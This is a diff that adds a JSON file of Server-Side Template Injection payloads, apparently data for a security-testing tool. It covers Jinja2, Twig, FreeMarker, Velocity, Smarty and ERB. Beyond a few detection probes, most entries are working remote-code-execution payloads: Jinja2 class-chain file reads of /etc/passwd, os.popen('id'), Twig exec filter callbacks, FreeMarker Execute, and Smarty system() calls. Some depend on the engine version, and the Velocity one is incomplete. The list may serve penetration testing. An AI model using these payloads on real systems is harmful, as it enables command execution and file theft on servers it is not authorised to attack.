@@ -1,0 +1,253 @@
+{
+    "category": "SSTI",
+    "description": "Server-Side Template Injection payloads for various template engines",
+    "payloads": [
+        {
+            "id": "ssti-detect-001",
+            "title": "Basic Detection",
+            "payload": "{{7*7}}",
+            "category": "SSTI",
+            "subcategory": "Detection",
+            "context": [
+                "input",
+                "template"
+            ],
+            "level": "low",
+            "tags": [
+                "detect",
+                "basic",
+                "math"
+            ],
+            "notes": "Returns 49 if vulnerable",
+            "source": "github"
+        },
+        {
+            "id": "ssti-detect-002",
+            "title": "Alternative Detection",
+            "payload": "${7*7}",
+            "category": "SSTI",
+            "subcategory": "Detection",
+            "context": [
+                "input",
+                "template"
+            ],
+            "level": "low",
+            "tags": [
+                "detect",
+                "freemarker",
+                "velocity"
+            ],
+            "notes": "FreeMarker/Velocity detection",
+            "source": "github"
+        },
+        {
+            "id": "ssti-detect-003",
+            "title": "ERB Detection",
+            "payload": "<%= 7*7 %>",
+            "category": "SSTI",
+            "subcategory": "Detection",
+            "context": [
+                "input",
+                "template"
+            ],
+            "level": "low",
+            "tags": [
+                "detect",
+                "erb",
+                "ruby"
+            ],
+            "notes": "Ruby ERB detection",
+            "source": "github"
+        },
+        {
+            "id": "ssti-jinja2-001",
+            "title": "Jinja2 Config",
+            "payload": "{{config}}",
+            "category": "SSTI",
+            "subcategory": "Jinja2",
+            "context": [
+                "input",
+                "flask"
+            ],
+            "level": "medium",
+            "tags": [
+                "jinja2",
+                "flask",
+                "config"
+            ],
+            "notes": "Dump Flask config",
+            "source": "github"
+        },
+        {
+            "id": "ssti-jinja2-002",
+            "title": "Jinja2 Self",
+            "payload": "{{self.__dict__}}",
+            "category": "SSTI",
+            "subcategory": "Jinja2",
+            "context": [
+                "input",
+                "flask"
+            ],
+            "level": "medium",
+            "tags": [
+                "jinja2",
+                "self",
+                "dict"
+            ],
+            "notes": "Dump template context",
+            "source": "github"
+        },
+        {
+            "id": "ssti-jinja2-003",
+            "title": "Jinja2 RCE",
+            "payload": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+            "category": "SSTI",
+            "subcategory": "Jinja2",
+            "context": [
+                "input",
+                "flask"
+            ],
+            "level": "high",
+            "tags": [
+                "jinja2",
+                "rce",
+                "file"
+            ],
+            "notes": "Read file via class chain",
+            "source": "github"
+        },
+        {
+            "id": "ssti-jinja2-004",
+            "title": "Jinja2 OS Command",
+            "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+            "category": "SSTI",
+            "subcategory": "Jinja2",
+            "context": [
+                "input",
+                "flask"
+            ],
+            "level": "high",
+            "tags": [
+                "jinja2",
+                "rce",
+                "os"
+            ],
+            "notes": "Execute OS command",
+            "source": "github"
+        },
+        {
+            "id": "ssti-twig-001",
+            "title": "Twig Detection",
+            "payload": "{{_self.env.display('')}}",
+            "category": "SSTI",
+            "subcategory": "Twig",
+            "context": [
+                "input",
+                "php"
+            ],
+            "level": "medium",
+            "tags": [
+                "twig",
+                "php",
+                "detect"
+            ],
+            "notes": "Twig template engine detection",
+            "source": "github"
+        },
+        {
+            "id": "ssti-twig-002",
+            "title": "Twig RCE",
+            "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+            "category": "SSTI",
+            "subcategory": "Twig",
+            "context": [
+                "input",
+                "php"
+            ],
+            "level": "high",
+            "tags": [
+                "twig",
+                "rce",
+                "exec"
+            ],
+            "notes": "Twig RCE via filter callback",
+            "source": "github"
+        },
+        {
+            "id": "ssti-freemarker-001",
+            "title": "FreeMarker Execute",
+            "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+            "category": "SSTI",
+            "subcategory": "FreeMarker",
+            "context": [
+                "input",
+                "java"
+            ],
+            "level": "high",
+            "tags": [
+                "freemarker",
+                "java",
+                "rce"
+            ],
+            "notes": "FreeMarker command execution",
+            "source": "github"
+        },
+        {
+            "id": "ssti-velocity-001",
+            "title": "Velocity Runtime",
+            "payload": "#set($e=\"\")$e.getClass().forName(\"java.lang.Runtime\")",
+            "category": "SSTI",
+            "subcategory": "Velocity",
+            "context": [
+                "input",
+                "java"
+            ],
+            "level": "high",
+            "tags": [
+                "velocity",
+                "java",
+                "runtime"
+            ],
+            "notes": "Velocity template RCE",
+            "source": "github"
+        },
+        {
+            "id": "ssti-smarty-001",
+            "title": "Smarty PHP",
+            "payload": "{php}echo `id`;{/php}",
+            "category": "SSTI",
+            "subcategory": "Smarty",
+            "context": [
+                "input",
+                "php"
+            ],
+            "level": "high",
+            "tags": [
+                "smarty",
+                "php",
+                "backtick"
+            ],
+            "notes": "Smarty PHP tag execution",
+            "source": "github"
+        },
+        {
+            "id": "ssti-smarty-002",
+            "title": "Smarty System",
+            "payload": "{system('id')}",
+            "category": "SSTI",
+            "subcategory": "Smarty",
+            "context": [
+                "input",
+                "php"
+            ],
+            "level": "high",
+            "tags": [
+                "smarty",
+                "php",
+                "system"
+            ],
+            "notes": "Smarty system function",
+            "source": "github"
+        }
+    ]
+}
